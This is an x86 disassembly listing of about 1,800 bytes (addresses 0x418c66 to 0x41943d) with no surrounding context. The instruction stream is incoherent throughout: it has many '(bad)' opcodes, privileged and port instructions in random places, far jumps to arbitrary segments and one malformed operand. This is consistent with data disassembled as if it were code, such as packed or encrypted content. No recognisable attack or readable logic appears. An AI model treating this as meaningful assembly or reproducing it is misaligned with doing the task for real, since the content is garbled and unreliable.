  418c66:	out    dx,al
  418c67:	cli    
  418c68:	cmp    edi,esp
  418c6a:	icebp  
  418c6b:	and    edx,DWORD PTR [eax-0x7a]
  418c6e:	fsub   st(7),st
  418c70:	ds sbb eax,0x13492107
  418c76:	mov    bh,0x98
  418c78:	daa    
  418c79:	push   ds
  418c7a:	cmp    eax,0x8f582a10
  418c7f:	not    BYTE PTR [ebx]
  418c81:	and    dl,BYTE PTR ds:0xe431205
  418c87:	pop    ds
  418c88:	stc    
  418c89:	test   al,0x69
  418c8b:	dec    eax
  418c8c:	sub    bl,ah
  418c8e:	sbb    eax,0xc306caca
  418c93:	ds popa 
  418c95:	dec    ebp
  418c96:	arpl   bx,bp
  418c98:	cdq    
  418c99:	icebp  
  418c9a:	fwait
  418c9b:	pop    ds
  418c9c:	(bad)  
  418c9d:	sbb    eax,0xf0cd9067
  418ca2:	bt     DWORD PTR [ebp+0x1a],edx
  418ca6:	inc    ebx
  418ca7:	jg     0x418c9e
  418ca9:	jmp    0xbcd:0x72f815f7
  418cb0:	or     al,0xcc
  418cb2:	push   esi
  418cb3:	xchg   ebx,eax
  418cb4:	jmp    0x3acdae39
  418cb9:	add    al,0x77
  418cbb:	sbb    DWORD PTR [ebx-0x7e],ebx
  418cbe:	push   ebx
  418cbf:	push   edi
  418cc0:	jae    0x418cce
  418cc2:	jae    0x418c88
  418cc4:	out    0x1d,al
  418cc6:	je     0x418c85
  418cc8:	mov    edx,DWORD PTR [esi]
  418cca:	sbb    edx,ecx
  418ccc:	xor    edi,DWORD PTR [ecx]
  418cce:	jmp    0x3e258f82
  418cd3:	jmp    0x715f:0xc7cf6e4d
  418cda:	and    BYTE PTR [esi+0x74017450],ch
  418ce0:	out    0xae,eax
  418ce2:	jmp    0x418cf9
  418ce4:	fs or  edi,edi
  418ce7:	sub    bl,BYTE PTR cs:[eax+0x54]
  418ceb:	fcomp  QWORD PTR [ebx]
  418ced:	adc    al,0x2
  418cef:	push   es
  418cf0:	mov    ch,0xc3
  418cf2:	shr    BYTE PTR [ecx],cl
  418cf4:	or     ebx,ebx
  418cf6:	shl    BYTE PTR [edi-0x64bb45d5],0xb8
  418cfd:	jo     0x418d2e
  418cff:	sbb    eax,edi
  418d01:	dec    esp
  418d02:	(bad)  
  418d04:	xchg   ebx,eax
  418d05:	inc    ebx
  418d06:	mov    edx,0xfdbeb30e
  418d0b:	lds    edx,FWORD PTR [edx]
  418d0d:	shl    DWORD PTR [ecx-0x36a91916],cl
  418d13:	shl    edi,1
  418d15:	cs imul edi,edi,0xffffffa6
  418d19:	jo     0x418d6f
  418d1b:	add    al,0x6b
  418d1d:	test   eax,0xff4b9f6a
  418d22:	ins    DWORD PTR es:[edi],dx
  418d23:	call   0x41555158
  418d28:	pop    ss
  418d29:	cmp    ch,ah
  418d2b:	sbb    BYTE PTR [ecx+ebx*1+0x1bb2a1ee],0x2
  418d33:	mov    bh,0x64
  418d35:	rol    bh,1
  418d37:	mov    bl,0x40
  418d39:	shl    dl,cl
  418d3b:	icebp  
  418d3c:	xor    ch,BYTE PTR [eax-0x34a471ae]
  418d42:	jns    0x418cf1
  418d44:	sahf   
  418d45:	xchg   esp,eax
  418d46:	ret    
  418d47:	rol    DWORD PTR [edi-0x53722b83],cl
  418d4d:	xchg   esp,eax
  418d4e:	mov    dl,0xc1
  418d50:	ins    DWORD PTR es:[edi],dx
  418d51:	outs   dx,DWORD PTR ds:[esi]
  418d52:	pusha  
  418d53:	fnstenv [ecx]
  418d55:	push   esp
  418d56:	add    ch,BYTE PTR [eax-0x6]
  418d59:	cmp    ch,ah
  418d5b:	pusha  
  418d5c:	rcr    DWORD PTR [edi+0x30],cl
  418d5f:	adc    al,0x72
  418d61:	jp     0x418d21
  418d63:	(bad)  
  418d64:	and    BYTE PTR [eax+edx*8+0x50],0x35
  418d69:	sub    DWORD PTR [ebp+0x2dd65c38],0xffffffba
  418d70:	in     al,dx
  418d71:	(bad)  
  418d72:	retf   
  418d73:	pop    ebx
  418d74:	in     eax,dx
  418d75:	lods   al,BYTE PTR ds:[esi]
  418d76:	les    esp,FWORD PTR [ebx]
  418d78:	push   ss
  418d79:	xchg   DWORD PTR [ebx-0x2a],ebp
  418d7c:	cmp    eax,0x47c334e7
  418d81:	adc    eax,0x95fcf6a0
  418d86:	jmp    0x418daa
  418d88:	mov    ds:0xc7794645,al
  418d8d:	dec    edx
  418d8e:	dec    ebp
  418d8f:	jmp    0x32:0x9849e2cc
  418d96:	push   ebp
  418d97:	push   0x9df2660b
  418d9c:	std    
  418d9d:	sbb    eax,0xd05a6e92
  418da2:	call   0x5eb:0xc998370d
  418da9:	xchg   esi,eax
  418daa:	pop    esp
  418dab:	fsub   QWORD PTR [ebx+0x6bd93205]
  418db1:	call   0xa5e55520
  418db6:	aaa    
  418db7:	xor    al,0xfa
  418db9:	fild   QWORD PTR [edx+eax*2]
  418dbc:	mov    BYTE PTR ds:0x83af83a3,cl
  418dc2:	popf   
  418dc3:	inc    esp
  418dc4:	jne    0x418d5d
  418dc6:	mov    ds:0x15f2847d,al
  418dcb:	xchg   esp,eax
  418dcc:	or     edi,ecx
  418dce:	ror    BYTE PTR [ebp+ecx*8+0x54],0x61
  418dd3:	jne    0x418e4f
  418dd5:	ins    BYTE PTR es:[edi],dx
  418dd6:	and    eax,0xd04f6248
  418ddb:	leave  
  418ddc:	stos   BYTE PTR es:[edi],al
  418ddd:	mov    cs,ebp
  418ddf:	call   0xd30c1810
  418de4:	cmp    DWORD PTR [ebp-0x7e],edi
  418de7:	enter  0x5599,0x70
  418deb:	xchg   edx,eax
  418ded:	push   0xd2abd489
  418df2:	adc    eax,0x91d9cc61
  418df7:	aaa    
  418df8:	lock dec esp
  418dfa:	shr    DWORD PTR [ebp-0x2b4da8fa],cl
  418e00:	xor    ecx,ebx
  418e02:	xchg   DWORD PTR [esp+ebp*1+0x8],ebx
  418e06:	cmp    BYTE PTR [eax-0x37d2d68e],ah
  418e0c:	mov    ebp,0x7bfde6c
  418e11:	(bad)  
  418e12:	jmp    0x879:0xa729dcea
  418e19:	outs   dx,BYTE PTR ds:[esi]
  418e1a:	mov    dh,0xbb
  418e1c:	dec    ebx
  418e1d:	or     al,0x76
  418e1f:	pop    esp
  418e20:	jne    0x418e3b
  418e22:	in     al,dx
  418e23:	stos   BYTE PTR es:[edi],al
  418e24:	les    edi,FWORD PTR [ebp-0x264d18f9]
  418e2a:	pop    eax
  418e2b:	out    0xc6,eax
  418e2d:	mov    cl,al
  418e2f:	rcl    DWORD PTR [edx+ebx*8+0x281438b],cl
  418e36:	jae    0x418ddb
  418e38:	push   esi
  418e39:	rol    BYTE PTR [ecx],cl
  418e3b:	lahf   
  418e3c:	inc    edi
  418e3d:	adc    esp,esp
  418e3f:	jmp    0x7a5cc598
  418e44:	out    dx,eax
  418e45:	mov    eax,?
  418e47:	mov    cl,0x2f
  418e49:	int    0xe4
  418e4b:	cli    
  418e4c:	add    edi,eax
  418e4e:	dec    esi
  418e4f:	daa    
  418e50:	pop    edx
  418e51:	loopne 0x418e74
  418e53:	mov    cl,BYTE PTR [esi]
  418e55:	dec    ecx
  418e56:	bound  edx,QWORD PTR [edi+0x41]
  418e59:	pop    ecx
  418e5a:	ds loope 0x418e46
  418e5d:	adc    al,0xc
  418e5f:	mov    BYTE PTR [esi],cl
  418e61:	cmp    DWORD PTR [esi],0x6e
  418e64:	and    eax,0x1a06ac4c
  418e69:	retf   
  418e6a:	adc    BYTE PTR [eax-0x2ae77946],bh
  418e70:	add    cl,cl
  418e72:	xchg   DWORD PTR [edi+0x1c],ebp
  418e75:	sti    
  418e76:	push   esi
  418e77:	inc    ebx
  418e78:	mov    ds,esp
  418e7a:	pop    esp
  418e7b:	fmul   QWORD PTR [ebx]
  418e7d:	stos   BYTE PTR es:[edi],al
  418e7e:	mov    bl,0xc0
  418e80:	lahf   
  418e81:	js     0x418ef2
  418e83:	sub    esp,DWORD PTR [esi]
  418e85:	out    dx,eax
  418e86:	add    ch,BYTE PTR [ecx]
  418e88:	hlt    
  418e89:	jb     0x418e46
  418e8b:	pop    ds
  418e8c:	mov    dl,BYTE PTR [edx-0x4d7abf9e]
  418e92:	fldenv [ebp-0x66]
  418e95:	lahf   
  418e96:	into   
  418e97:	xchg   esi,eax
  418e98:	pop    ebx
  418e99:	je     0x418ec9
  418e9b:	scas   al,BYTE PTR es:[edi]
  418e9c:	push   ebp
  418e9d:	(bad)  
  418e9f:	std    
  418ea0:	inc    ecx
  418ea1:	xor    al,0xc9
  418ea3:	jne    0x418f11
  418ea5:	scas   eax,DWORD PTR es:[edi]
  418ea6:	(bad)  
  418ea7:	(bad)  
  418ea8:	mov    esi,0x2a4edaab
  418ead:	test   al,0x2d
  418eaf:	scas   ax,WORD PTR es:[edi]
  418eb1:	pavgb  mm2,QWORD PTR [edx+0x1657decd]
  418eb8:	imul   esp,DWORD PTR ds:0x36004c35,0xc0258abd
  418ec2:	pop    ebp
  418ec3:	test   al,0xf9
  418ec5:	or     eax,0x9c78b1c9
  418eca:	scas   al,BYTE PTR es:[edi]
  418ecb:	push   cs
  418ecc:	xor    edi,DWORD PTR [eax-0x55]
  418ecf:	enter  0x2ca2,0x85
  418ed3:	or     ebx,DWORD PTR [ebx+0x22]
  418ed6:	in     eax,dx
  418ed7:	pop    ss
  418ed8:	cli    
  418ed9:	and    eax,0x47a15c4c
  418ede:	add    dh,cl
  418ee0:	and    al,0xb
  418ee2:	lods   eax,DWORD PTR ds:[esi]
  418ee3:	in     eax,dx
  418ee4:	xlat   BYTE PTR es:[ebx]
  418ee6:	(bad)  
  418ee7:	stc    
  418ee8:	dec    ebp
  418ee9:	mov    ecx,0x75ef5625
  418eee:	mov    esi,0x2ead9ee
  418ef4:	cmp    al,0xd1
  418ef6:	cmp    eax,0xc21b92b
  418efb:	xor    edi,edx
  418efd:	mov    BYTE PTR [esi+0x5bf9d547],cl
  418f03:	xor    ecx,ebp
  418f05:	lods   eax,DWORD PTR ds:[esi]
  418f06:	xor    esi,edx
  418f08:	jbe    0x418f13
  418f0a:	add    BYTE PTR [esi],cl
  418f0c:	xor    dl,BYTE PTR [ebx]
  418f0e:	xor    eax,0xcc17e38a
  418f13:	stc    
  418f14:	popf   
  418f15:	mov    ebx,0xfdf52aed
  418f1a:	test   eax,esp
  418f1c:	sbb    al,0xe1
  418f1e:	repnz pop eax
  418f20:	or     BYTE PTR [ebx+0x41],cl
  418f23:	pushf  
  418f24:	xchg   ebp,eax
  418f25:	dec    edx
  418f26:	cmp    al,0xd3
  418f28:	enter  0xdc4a,0x89
  418f2c:	shl    DWORD PTR [esi],1
  418f2e:	push   esp
  418f2f:	in     eax,0xe2
  418f31:	int3   
  418f32:	mov    ebx,0x45ee725d
  418f37:	in     eax,0xaa
  418f39:	mov    esp,0xc59efc91
  418f3e:	arpl   dx,sp
  418f40:	and    edi,DWORD PTR [esi+0x56]
  418f43:	mov    cl,0xb2
  418f45:	sbb    eax,DWORD PTR [edi+0x23]
  418f48:	add    dl,al
  418f4a:	(bad)  
  418f4c:	cwde   
  418f4d:	pop    edx
  418f4e:	add    al,0xf4
  418f50:	pop    esi
  418f51:	icebp  
  418f52:	adc    BYTE PTR [ecx],dh
  418f54:	push   0x7acf9b66
  418f59:	cmp    BYTE PTR [ebp+0x4c],0x86
  418f5d:	les    edx,FWORD PTR [eax+0x7a]
  418f60:	pop    ds
  418f61:	pushf  
  418f62:	gs xor eax,0x6bce6491
  418f68:	fucom  st(3)
  418f6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f6b:	xor    DWORD PTR [edx-0x18],ecx
  418f6e:	retf   
  418f6f:	bound  eax,QWORD PTR ds:0x1676ad6
  418f75:	pop    ebx
  418f76:	or     DWORD PTR [ebx-0x7c],ebp
  418f79:	sbb    ebx,DWORD PTR [ebp+0x4a]
  418f7c:	popf   
  418f7d:	test   eax,0x57657521
  418f82:	data16 add BYTE PTR [ecx],bl
  418f85:	sbb    eax,0xbba4243f
  418f8a:	pop    edi
  418f8b:	push   edi
  418f8c:	xchg   ecx,eax
  418f8d:	bound  ebx,QWORD PTR [esi]
  418f8f:	xor    ch,BYTE PTR [esi+0x575ed93b]
  418f95:	pop    edi
  418f96:	cmp    esi,ecx
  418f98:	pop    eax
  418f99:	sbb    al,0xb9
  418f9b:	dec    BYTE PTR [ecx]
  418f9d:	and    al,al
  418f9f:	jecxz  0x418ffc
  418fa1:	lea    ebx,[ecx]
  418fa3:	sti    
  418fa4:	mov    ebx,0xd167b5bc
  418fa9:	dec    edi
  418faa:	push   ebp
  418fab:	and    edx,DWORD PTR [edi+eiz*4-0x2d6161a7]
  418fb2:	pop    es
  418fb3:	pushf  
  418fb4:	loope  0x418fb3
  418fb6:	pop    ebp
  418fb7:	addr16 jae 0x418f6b
  418fba:	jmp    0x9c68:0xb37b661
  418fc1:	fadd   QWORD PTR [edi+ecx*2-0x4729ba39]
  418fc8:	sub    BYTE PTR [edx],dh
  418fca:	shr    esi,0x3e
  418fcd:	pop    ebx
  418fce:	sub    DWORD PTR [ecx-0x5e],ebx
  418fd1:	xchg   ebp,eax
  418fd2:	sub    eax,DWORD PTR [edx-0x3a956f65]
  418fd8:	clc    
  418fd9:	jp     0x41904b
  418fdb:	mov    al,ds:0xe4617ccd
  418fe0:	iret   
  418fe1:	adc    eax,0xb56b0215
  418fe6:	sub    BYTE PTR [ecx+0x2b89c8f6],0x91
  418fed:	mov    al,ds:0xfdedd4b7
  418ff2:	push   edx
  418ff3:	sub    ah,BYTE PTR [esi-0xa164998]
  418ff9:	sti    
  418ffa:	xor    BYTE PTR [eax-0x30],bl
  418ffd:	dec    edi
  418ffe:	popa   
  418fff:	dec    esp
  419000:	daa    
  419001:	or     al,0x88
  419003:	or     al,0xa
  419005:	sub    al,0x53
  419007:	add    al,0x3a
  419009:	inc    edi
  41900a:	mov    gs,ebx
  41900c:	sub    al,0x72
  41900e:	sbb    ax,0x7ca7
  419012:	dec    ecx
  419013:	and    BYTE PTR [esi*8-0x4e3933c7],dl
  41901a:	push   edi
  41901b:	jge    0x41908f
  41901d:	cmp    DWORD PTR [ebx-0x2b],0x2c0430e4
  419024:	and    al,al
  419026:	mov    DWORD PTR [edi],eax
  419028:	pop    ds
  419029:	xchg   esi,eax
  41902a:	pusha  
  41902b:	fisubr DWORD PTR [ecx-0x36]
  41902e:	jmp    0x8acedd60
  419033:	inc    edi
  419034:	sbb    ah,BYTE PTR [eax]
  419036:	mov    esp,0xffd147f8
  41903b:	add    ebp,eax
  41903d:	xor    dl,BYTE PTR [ebx-0x73]
  419040:	push   edx
  419041:	adc    BYTE PTR [ebx+0x2b086bb],cl
  419047:	push   eax
  419048:	pop    edx
  419049:	mov    dh,0xc5
  41904b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41904c:	add    cl,BYTE PTR [esi+ebx*8-0x16b645b7]
  419053:	mov    edi,0x3a0a92f6
  419058:	shr    bl,cl
  41905a:	push   ebx
  41905b:	loop   0x41907a
  41905d:	cmc    
  41905e:	or     al,0xda
  419060:	pop    es
  419061:	lods   eax,DWORD PTR ds:[esi]
  419062:	fwait
  419063:	pop    ecx
  419064:	inc    edi
  419065:	adc    DWORD PTR [eax-0x1017494f],0xffffffbe
  41906c:	mov    dh,0x6c
  41906e:	retf   
  41906f:	and    BYTE PTR [ebx+0x26880ae0],dl
  419075:	cli    
  419076:	call   0xcbf829ce
  41907b:	mov    dl,BYTE PTR fs:[esi-0x2efae67d]
  419082:	dec    esp
  419083:	pop    eax
  419084:	pop    edi
  419085:	push   esi
  419086:	call   0xdc1570e0
  41908b:	push   ebp
  41908c:	adc    edx,edx
  41908e:	in     eax,0x5d
  419090:	jp     0x4190e2
  419092:	and    DWORD PTR [esi+edi*2-0x452746f],ecx
  419099:	push   ss
  41909a:	sti    
  41909b:	xor    eax,DWORD PTR [ebp+ecx*4-0xb]
  41909f:	xchg   ebp,eax
  4190a0:	mov    esi,0xce298840
  4190a5:	repnz mov bl,ah
  4190a8:	push   ss
  4190a9:	pop    ss
  4190aa:	fldenv [edi+esi*2+0x43904802]
  4190b1:	lds    ebp,FWORD PTR [edx-0x33]
  4190b4:	sbb    eax,0x1ad81141
  4190b9:	and    esi,esp
  4190bb:	sub    eax,0x31a27bd2
  4190c0:	int3   
  4190c1:	mov    ecx,ebp
  4190c3:	stc    
  4190c4:	xchg   edi,eax
  4190c5:	nop
  4190c6:	lahf   
  4190c7:	ds out dx,eax
  4190c9:	add    esp,DWORD PTR [esi-0x58b61bb7]
  4190cf:	or     DWORD PTR [ebx+0x4c],edi
  4190d2:	pop    ss
  4190d3:	aam    0x30
  4190d5:	push   cs
  4190d6:	xchg   esp,eax
  4190d7:	out    dx,eax
  4190d8:	adc    DWORD PTR [esp+edx*8],esp
  4190db:	rol    BYTE PTR [ecx-0x9],0x59
  4190df:	mov    bh,0xac
  4190e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190e2:	jmp    0x4190f6
  4190e4:	ds sub al,0x14
  4190e7:	and    al,0xeb
  4190e9:	or     DWORD PTR [ebx+esi*2+0x71],eax
  4190ed:	cdq    
  4190ee:	sub    BYTE PTR [ebp-0x28838e24],dl
  4190f4:	inc    ebp
  4190f5:	retf   0xaa18
  4190f8:	sbb    al,0xeb
  4190fa:	add    DWORD PTR ds:0xf0293633,edi
  419100:	adc    BYTE PTR [eax-0x3b310e35],ah
  419106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419107:	(bad)  [edi+0x2a]
  41910a:	and    BYTE PTR [edi-0x3a1e9579],dl
  419110:	gs rcl esi,cl
  419113:	mov    WORD PTR [edi-0x3163a49d],ss
  419119:	in     al,0xca
  41911b:	jns    0x4190e8
  41911d:	jg     0x4190d2
  41911f:	cmp    ebp,ebp
  419121:	cmp    al,0x12
  419123:	jg     0x419184
  419125:	cdq    
  419126:	imul   esi,DWORD PTR [ecx],0x9734c0a4
  41912c:	iret   
  41912d:	into   
  41912e:	into   
  41912f:	loop   0x4190f0
  419131:	add    bl,BYTE PTR [edx]
  419133:	mov    ds,WORD PTR [ecx]
  419135:	jne    0x419187
  419137:	mov    cl,0xd4
  419139:	data16 ds mov dh,0xe1
  41913d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41913e:	gs push es
  419140:	das    
  419141:	jmp    0x4191b2
  419143:	adc    DWORD PTR [esi+0x35],esp
  419146:	adc    BYTE PTR [ecx+0x42],cl
  419149:	jmp    0x13997308
  41914e:	in     eax,0x42
  419150:	pop    esp
  419151:	aam    0x7d
  419153:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419154:	clc    
  419155:	je     0x419148
  419157:	lahf   
  419158:	rol    DWORD PTR [ecx-0x1e],cl
  41915b:	inc    ebx
  41915c:	mov    ch,0x72
  41915e:	jg     0x419146
  419160:	(bad)  
  419161:	sbb    DWORD PTR [edx],edi
  419163:	arpl   WORD PTR [esi+0x5bc77f96],bp
  419169:	fimul  WORD PTR [ebx-0x7d]
  41916c:	sti    
  41916d:	out    dx,al
  41916e:	jmp    0x4190f2
  419170:	das    
  419171:	or     eax,0xc63e9fbf
  419176:	cld    
  419177:	push   0xd2a4cb3e
  41917c:	aaa    
  41917d:	and    eax,0xf5232c1b
  419182:	dec    edx
  419183:	jp     0x41916c
  419185:	sub    eax,0x56935c7
  41918a:	jle    0x419209
  41918c:	adc    eax,0x2427bc6
  419191:	and    al,0x7a
  419193:	or     ch,BYTE PTR [ecx+eax*1]
  419196:	or     eax,0x992ae65c
  41919b:	pop    ss
  41919c:	xchg   esp,eax
  41919d:	int    0x16
  41919f:	hlt    
  4191a0:	(bad)  
  4191a2:	xor    ah,BYTE PTR [esi]
  4191a4:	mov    cl,cl
  4191a6:	xor    DWORD PTR [esi],edx
  4191a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191a9:	jmp    FWORD PTR [eax+0x3f]
  4191ac:	ja     0x4191b2
  4191ae:	repnz add esi,edx
  4191b1:	test   ebp,esi
  4191b3:	enter  0x3c74,0xd
  4191b7:	inc    ebx
  4191b8:	repnz xor al,0x42
  4191bb:	pop    ss
  4191bc:	rcr    DWORD PTR [ebx],cl
  4191be:	sar    DWORD PTR [ecx-0x40779428],1
  4191c4:	ret    
  4191c5:	cmp    eax,0xb12ed0a
  4191ca:	repz mov dl,cl
  4191cd:	xchg   esi,eax
  4191ce:	rol    BYTE PTR [ebp+0x4d],cl
  4191d1:	push   edx
  4191d2:	add    esi,DWORD PTR [ebx+0x7a]
  4191d5:	sbb    bh,BYTE PTR [esi]
  4191d7:	enter  0x4f0b,0x56
  4191db:	mov    ds:0x8291a0a8,al
  4191e0:	sub    ch,BYTE PTR [edi]
  4191e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191e3:	in     al,0x7d
  4191e5:	int3   
  4191e6:	or     dl,dh
  4191e8:	iret   
  4191e9:	cdq    
  4191ea:	add    edi,edi
  4191ec:	(bad)
  4191ef:	add    eax,0x59366118
  4191f4:	jns    0x4191c8
  4191f6:	ins    DWORD PTR es:[edi],dx
  4191f7:	nop
  4191f8:	and    DWORD PTR [ebx],0xff9360db
  4191fe:	leave  
  4191ff:	scas   al,BYTE PTR es:[edi]
  419200:	scas   eax,DWORD PTR es:[edi]
  419201:	pop    ecx
  419202:	inc    esi
  419203:	aas    
  419204:	or     dh,bh
  419206:	into   
  419207:	(bad)  
  419208:	into   
  419209:	mov    ah,0x27
  41920b:	scas   eax,DWORD PTR es:[edi]
  41920c:	addr16 mov ebp,0x9f5df7da
  419212:	and    ch,BYTE PTR [ebp+0x1ef29203]
  419218:	js     0x4191b4
  41921a:	nop
  41921b:	jl     0x419239
  41921d:	adc    ebp,eax
  41921f:	and    eax,0x1f334a54
  419224:	sbb    ch,BYTE PTR [edi+ebp*1-0x4127faeb]
  41922b:	fld    DWORD PTR [edx]
  41922d:	push   edx
  41922e:	pop    esi
  41922f:	test   BYTE PTR [edx+edx*4-0x6d],0x41
  419234:	jns    0x4191d7
  419236:	push   ss
  419237:	loope  0x41923a
  419239:	xchg   DWORD PTR [ecx+0x3f7132f7],ebp
  41923f:	jg     0x41925c
  419241:	add    esp,esi
  419243:	push   ss
  419244:	rsm    
  419246:	pop    es
  419247:	and    BYTE PTR [edi+0x4e846203],bl
  41924d:	or     ebp,DWORD PTR [edx+0x11]
  419250:	ja     0x419257
  419252:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419253:	jg     0x4192ad
  419255:	shl    DWORD PTR [ebx-0x4b],1
  419258:	push   eax
  419259:	pop    ebp
  41925a:	pop    ss
  41925b:	adc    ah,0x74
  41925e:	mov    ds:0xab512674,eax
  419263:	leave  
  419264:	sub    bh,bh
  419266:	int    0xb0
  419268:	or     BYTE PTR [esi+0x4c],al
  41926b:	jno    0x419290
  41926d:	rcl    BYTE PTR [edi+0x7c],1
  419270:	sar    DWORD PTR [ebp-0x10],1
  419273:	pshufw mm4,QWORD PTR [ebx],0xa6
  419277:	add    ch,BYTE PTR [ebp+0x2c001ef2]
  41927d:	sbb    eax,ebp
  41927f:	jne    0x41928d
  419281:	adc    BYTE PTR [ecx+0x4d],ah
  419284:	shl    BYTE PTR [eax-0x1396869d],1
  41928a:	add    al,0x75
  41928c:	jno    0x4192ca
  41928e:	pop    eax
  419290:	sub    dh,ah
  419292:	jns    0x4192f5
  419294:	jecxz  0x419228
  419296:	cmp    eax,0x2f0b8d93
  41929b:	push   edi
  41929c:	test   bh,al
  41929e:	popa   
  41929f:	iret   
  4192a0:	xlat   BYTE PTR ds:[ebx]
  4192a1:	lds    esp,FWORD PTR [ecx]
  4192a3:	or     al,0x98
  4192a5:	fbstp  TBYTE PTR [eax-0x6d]
  4192a8:	data16 data16 mov dl,0xde
  4192ac:	ficomp WORD PTR [edi]
  4192ae:	loopne 0x4192e1
  4192b0:	aas    
  4192b1:	in     eax,dx
  4192b2:	clc    
  4192b3:	shl    bh,1
  4192b5:	(bad)  
  4192b7:	cdq    
  4192b8:	sahf   
  4192b9:	xchg   ebp,eax
  4192ba:	fsub   QWORD PTR [edi-0x69]
  4192bd:	in     eax,0x7c
  4192bf:	sub    edi,DWORD PTR [ebx+0x5ca2c7f5]
  4192c5:	sub    al,0xfc
  4192c7:	xchg   esp,eax
  4192c8:	add    BYTE PTR [edx+ecx*2],bh
  4192cb:	pop    ebx
  4192cc:	dec    esi
  4192cd:	jge    0x4192e3
  4192cf:	add    bl,bl
  4192d1:	push   edi
  4192d2:	mov    esp,0xba20b55a
  4192d7:	inc    ebp
  4192d8:	mov    al,0xb0
  4192da:	(bad)  
  4192db:	xor    esi,DWORD PTR [edx+0x4]
  4192de:	(bad)  
  4192df:	sbb    ebx,edi
  4192e1:	in     eax,0x15
  4192e3:	add    eax,0x271dc755
  4192e8:	mov    ebp,0x154852e5
  4192ed:	shl    BYTE PTR [eax-0x7390e8c5],1
  4192f3:	sti    
  4192f4:	scas   eax,DWORD PTR es:[edi]
  4192f5:	fisub  DWORD PTR [edx-0x659ef49b]
  4192fb:	xchg   ecx,eax
  4192fc:	xor    ebp,DWORD PTR [edx+0x3]
  4192ff:	dec    ecx
  419300:	mov    edx,0x536be535
  419305:	add    BYTE PTR [ebx-0x54],ah
  419308:	jp     0x419310
  41930a:	sub    al,0x7
  41930c:	test   eax,0x65d43f0b
  419311:	xchg   ebp,eax
  419312:	js     0x4192db
  419314:	fisttp QWORD PTR [eax-0x7f116f2e]
  41931a:	ja     0x419378
  41931c:	dec    ebx
  41931d:	mov    ecx,0x4ea44f3f
  419322:	mov    al,ds:0x29aa8a6
  419327:	cld    
  419328:	outs   dx,BYTE PTR ds:[esi]
  419329:	mov    ch,0x4f
  41932b:	add    eax,0x1fd0593c
  419330:	add    DWORD PTR [edx-0x68],0x4c3e9f0f
  419337:	loope  0x41932a
  419339:	push   ebx
  41933a:	mov    ch,0x40
  41933c:	push   ebp
  41933d:	push   edx
  41933e:	adc    DWORD PTR [esi-0x57af2203],0x91459355
  419348:	aas    
  419349:	sub    DWORD PTR [esi+0x44aec6c1],esi
  41934f:	sbb    DWORD PTR [eax],esp
  419351:	scas   eax,DWORD PTR es:[edi]
  419352:	div    BYTE PTR [edi-0x39]
  419355:	push   ebp
  419356:	(bad)  
  419357:	sbb    al,0x59
  419359:	cs adc al,0x83
  41935c:	mov    eax,ds
  41935e:	mov    eax,0xa5729681
  419363:	sub    ecx,DWORD PTR [eax+edi*4]
  419366:	arpl   bx,sp
  419368:	pusha  
  419369:	lea    edi,[ebx]
  41936b:	jmp    0x41933b
  41936d:	inc    esp
  41936e:	sbb    BYTE PTR [eax],0x57
  419371:	xchg   edi,eax
  419372:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419373:	pop    ds
  419374:	sub    al,0x6a
  419376:	push   edi
  419377:	(bad)  
  419378:	mov    ebx,0x488dc7bf
  41937e:	push   cs
  41937f:	jle    0x4193a6
  419381:	scas   al,BYTE PTR es:[edi]
  419382:	jmp    DWORD PTR [ecx-0x2a06336f]
  419388:	cmp    eax,0x9d5862e6
  41938d:	mov    bh,BYTE PTR ds:0x57c88f3a
  419393:	and    DWORD PTR [ebp*8-0x1b1d2fd4],eax
  41939a:	or     eax,0x67c74c25
  41939f:	xor    DWORD PTR [esi+ebp*8-0x45],edi
  4193a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193a4:	dec    ebp
  4193a5:	into   
  4193a6:	mov    cl,0xbf
  4193a8:	aam    0x26
  4193aa:	add    BYTE PTR [edx-0x42],dl
  4193ad:	fwait
  4193ae:	sub    eax,0xd461c0ed
  4193b3:	ja     0x4193d5
  4193b5:	sti    
  4193b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193b7:	mov    bh,0x9c
  4193b9:	cs push 0xfd0886d1
  4193bf:	cmp    al,0x87
  4193c1:	adc    al,0xc4
  4193c3:	push   ebp
  4193c4:	(bad)  [ebp-0x10bffa9d]
  4193ca:	ret    
  4193cb:	adc    DWORD PTR [eax],ebx
  4193cd:	cmp    al,0xd1
  4193cf:	pop    ebx
  4193d0:	or     DWORD PTR [edi-0x31],edi
  4193d3:	sbb    al,0xdb
  4193d5:	jae    0x41935f
  4193d7:	jns    0x4193d0
  4193d9:	lock sub cl,BYTE PTR [esi+0x37]
  4193dd:	popa   
  4193de:	mov    DWORD PTR [ecx-0x1280f9ad],eax
  4193e4:	lea    edi,[esi]
  4193e6:	jp     0x419442
  4193e8:	sub    edi,DWORD PTR [ebx]
  4193ea:	popf   
  4193eb:	push   esp
  4193ec:	ins    BYTE PTR es:[edi],dx
  4193ed:	int    0xc2
  4193ef:	repz enter 0xc14c,0x42
  4193f4:	or     dl,BYTE PTR [edi+0x227385c7]
  4193fa:	sti    
  4193fb:	push   esp
  4193fc:	xor    al,0x3
  4193fe:	xor    BYTE PTR [ecx+esi*8],dh
  419401:	js     0x4193f8
  419403:	dec    ebx
  419404:	inc    esi
  419405:	pop    eax
  419406:	cmp    DWORD PTR [eax],0x1c
  419409:	cmp    DWORD PTR [ebp+0x7d],ecx
  41940c:	out    dx,al
  41940d:	push   esp
  41940e:	and    bl,bl
  419410:	mov    ebx,0x536e4e52
  419415:	pop    ecx
  419416:	inc    ebp
  419417:	inc    esp
  419418:	arpl   WORD PTR [edi+0x429d912e],dx
  41941e:	out    0xac,al
  419420:	add    eax,0x79544502
  419425:	push   esp
  419426:	ss or  eax,0x60021284
  41942c:	jecxz  0x419406
  41942e:	call   0xfc6c00cd
  419433:	mov    edx,0x6d253a92
  419438:	mov    edx,ebp
  41943a:	retf   0xbdf0
  41943d:	cld    
